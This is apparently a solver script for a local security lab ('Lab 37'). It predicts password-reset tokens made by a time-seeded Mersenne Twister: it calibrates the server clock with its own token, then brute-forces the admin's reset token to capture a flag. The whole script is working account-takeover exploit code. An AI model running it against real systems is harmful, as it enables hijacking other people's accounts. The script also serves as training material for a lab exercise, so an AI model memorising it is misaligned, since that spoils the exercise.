#!/usr/bin/env bash
# Lab 37 — the token is a Mersenne Twister seeded with the current second.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:9370}"
. "$(dirname "$0")/../lib/h5i.sh"
new_session lab37

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null

ask() {  # ask EMAIL -> the JSON body
    send "$SESSION" req_0 --create --set method=POST --set path=/api/recover \
        --set header.Content-Type=application/json --set "json.email=$1" | body
}

# 1. Calibrate: a token you are allowed to see, and the second that made it.
MINE="$(ask "me@example.test" | jfield token)"
OFFSET="$(python3 - "$MINE" <<'PY'
import random, sys, time
now = int(time.time())
for t in range(now - 5, now + 6):
    r = random.Random(t)
    if "%08x%08x" % (r.getrandbits(32), r.getrandbits(32)) == sys.argv[1]:
        print(t - now); break
else:
    print("nocal")
PY
)"
[ "$OFFSET" = "nocal" ] && { echo "could not recover the seed"; exit 1; }
echo "server clock offset: ${OFFSET}s" >&2

# 2. Ask for the admin's token, then compute what it must have been.
ask "admin@acme.test" >/dev/null
for T in $(python3 - "$OFFSET" <<'PY'
import random, sys, time
base = int(time.time()) + int(sys.argv[1])
for t in range(base - 2, base + 3):
    r = random.Random(t)
    print("%08x%08x" % (r.getrandbits(32), r.getrandbits(32)))
PY
); do
    OUT="$(send "$SESSION" req_0 --create --reset-budget \
        --set path=/api/recover/use --set "query.token=$T" | flag)"
    [ "$OUT" != "no flag found" ] && { printf '%s\n' "$OUT"; exit 0; }
done
echo "no flag found"
